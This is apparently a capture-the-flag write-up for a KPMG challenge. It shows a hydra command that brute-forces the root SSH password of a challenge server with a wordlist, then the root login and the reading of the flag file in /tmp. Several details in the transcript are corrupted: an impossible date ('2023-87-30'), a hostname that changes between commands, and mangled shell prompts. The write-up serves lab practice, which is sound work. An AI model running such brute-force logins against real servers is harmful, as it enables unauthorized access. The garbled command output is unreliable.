## Task :
Rumors have circulated among the hacking community that inside the facility lies a powerful flag, the ultimate prize that grants the possessor unprecedented control over cyberspace. This flag is said to hold the key to accessing top-secret government networks, unlocking untold secrets, and potentially altering the course of history. The flag is rumored to reside possibly within the temporary folder.

Note: Be Careful to not get detected if bruteforcing.

## Points : 150

## Solution:

This challenge gives us a domain and port to connect to. When we connect to it, we can see it has a ssh server running. This server requires a username and password. We are also given a wordlist. The title also hint to using `hydra` for bruteforcing.

```sh
[ssk@arch kic]$ hydra -s 13117 -l root -P wordlist.txt 0.cloud.chals.io ssh -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these  *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-87-30 16:37:17

[DATA] max 4 tasks per 1 server, overall 4 tasks, 20 login tries (l:1/p:20), ~5 tries per task
[DATA] attacking ssh://0.cloud.chals.io:13117/

[13117][ssh] host: 0.cloud.chals.io login: root password: iloveyou

1 of 1 target successfully completed, 1 valid password found

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-87-30 1
```
`hydra` is successfully able to find the password `iloveyou` that we can use to ssh into the server.
```sh
[ssk@arch kic]$ ssh root@e.cloud.chals.io -p 13117
'root@0.cloud.chals.io's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.4.0-155-generic x86_64)

* Documentation: https://help.ubuntu.com
* Management: https: //landscape.canonical.com
* Support: https: //ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
rootEBE9Db14B12458: ~# ls
root@8E9b14B12458:~# cd /tmp
rootE8e9b14812458:/tmp# ls
flag. txt
root@809b14812458:/tmp# cat flag.txt
KPMG_CTF{eb9d31640af3509257a8d36758bc95da}
```